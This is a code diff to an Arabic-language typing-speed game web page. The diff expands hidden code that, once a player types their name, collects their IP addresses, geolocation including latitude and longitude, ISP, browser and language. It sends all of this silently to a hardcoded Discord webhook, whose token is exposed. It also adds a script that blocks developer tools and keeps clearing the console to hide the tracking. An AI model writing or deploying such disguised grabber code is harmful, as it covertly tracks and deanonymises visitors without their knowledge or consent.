@@ -3,12 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>اختبر سرعتك</title>
+  <title>اختبر سرعتك + حماية</title>
   <style>
     body {
       font-family: Tahoma, sans-serif;
       direction: rtl;
-      margin: 0; padding: 0;
+      margin: 0;
+      padding: 0;
       text-align: center;
       min-height: 100vh;
       background: linear-gradient(135deg, #e0f7fa, #fce4ec);
@@ -91,9 +92,6 @@
       font-size: 18px;
       margin-top: 10px;
     }
-    .hidden {
-      display: none;
-    }
   </style>
 </head>
 <body>
@@ -111,7 +109,7 @@
 </div>
 
 <!-- شاشة الاختبار -->
-<div class="container hidden" id="gameScreen">
+<div class="container" id="gameScreen" style="display:none;">
   <h2 id="welcomeMsg"></h2>
   <div id="sentence">...</div>
   <input type="text" id="userInput" placeholder="اكتب هنا" onkeydown="handleEnter(event)" />
@@ -125,6 +123,7 @@
 <audio id="bgMusic" src="https://c.top4top.io/m_343844pxd1.mp3" loop></audio>
 
 <script>
+  // ================== سكربت اللعبة ===================
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w';
 
   const sentences = [
@@ -141,7 +140,6 @@
   let startTime = 0;
   let highestSpeed = 0;
   let bestTime = null;
-  let name = "";
 
   const loginScreen = document.getElementById("loginScreen");
   const gameScreen = document.getElementById("gameScreen");
@@ -157,18 +155,21 @@
   const musicControl = document.getElementById("musicControl");
 
   function startGame() {
-    name = playerName.value.trim();
+    const name = playerName.value.trim();
     if (!name) return alert("اكتب اسمك أول");
     welcomeMsg.textContent = `يلا يا ${name}، اكتب بسرعة`;
-    loginScreen.classList.add("hidden");
-    gameScreen.classList.remove("hidden");
-    record.style.display = 'block';
+    loginScreen.style.display = "none";
+    gameScreen.style.display = "block";
+    record.style.display = "block";
     music.volume = 0.3;
+
+    // تشغيل الموسيقى
     music.play().catch(() => {
       musicControl.textContent = "🔇";
     });
+
     nextSentence();
-    sendUserData();
+    sendUserInfo(name);
   }
 
   function nextSentence() {
@@ -224,6 +225,7 @@
         colored += `<span style="color:red;">${sentenceWords[i]}</span> `;
       }
     }
+
     sentence.innerHTML = colored.trim();
   });
 
@@ -237,7 +239,7 @@
     }
   });
 
-  async function sendUserData() {
+  async function sendUserInfo(name) {
     try {
       const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
         fetch('https://api.ipify.org?format=json'),
@@ -251,25 +253,69 @@
       const ua = navigator.userAgent;
       const lang = navigator.language;
       const now = new Date();
-      const timeString = now.getFullYear() + '/' +
-        String(now.getMonth() + 1).padStart(2, '0') + '/' +
-        String(now.getDate()).padStart(2, '0') + ' ' +
-        String(now.getHours()).padStart(2, '0') + ':' +
-        String(now.getMinutes()).padStart(2, '0') + ':' +
-        String(now.getSeconds()).padStart(2, '0');
+      const timeString = now.toISOString();
 
-      const infoText = `
+      const ipv4 = ipv4Data.ip;
+      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
 
-      fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: infoText })
-      });
+      function sendToWebhook(extraGeo = '') {
+        const infoText = `
+الاسم: ${name}
+IP (IPv4): ${ipv4}
+IP (IPv6): ${ipv6}
+الدولة: ${geoData.country_name}
+المنطقة: ${geoData.region}
+المدينة: ${geoData.city}
+خط العرض: ${geoData.latitude}
+خط الطول: ${geoData.longitude}
+المنظمة: ${geoData.org}
+المنطقة الزمنية: ${geoData.timezone}
+متصفح المستخدم: ${ua}
+اللغة: ${lang}
+الوقت: ${timeString}
+${extraGeo}
+        `.trim();
 
-    } catch {
-      // تجاهل الأخطاء بهدوء
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: infoText }),
+        });
+      }
+
+      sendToWebhook();
+
+    } catch (e) {
+      console.log("خطأ في جلب معلومات المستخدم:", e);
     }
   }
+</script>
+
+<!-- =================== سكربت الحماية =================== -->
+<script id="protect-script">
+// ======== سكربت حماية Example =========
+// مثلاً حماية بسيطة توضح وجود الحماية وتظهر في أدوات المطور
+console.log("سكربت الحماية شغال!");
+
+// مثال: منع فتح أدوات المطور (لن يكون فعال 100% لكنه مثال)
+// يمكنك تحسينه أو دمج سكربت حماية آخر حسب الحاجة
+
+(function() {
+  // محاولة تعطيل F12 و Ctrl+Shift+I
+  document.addEventListener('keydown', function(e) {
+    if (e.key === "F12" || 
+        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "i")) {
+      e.preventDefault();
+      alert("فتح أدوات المطور غير مسموح!");
+    }
+  });
+
+  // إظهار رسالة في أدوات المطور عند الفتح
+  setInterval(() => {
+    console.clear();
+    console.log("🚨 حماية مفعلة 🚨");
+  }, 2000);
+})();
 </script>
 
 </body>
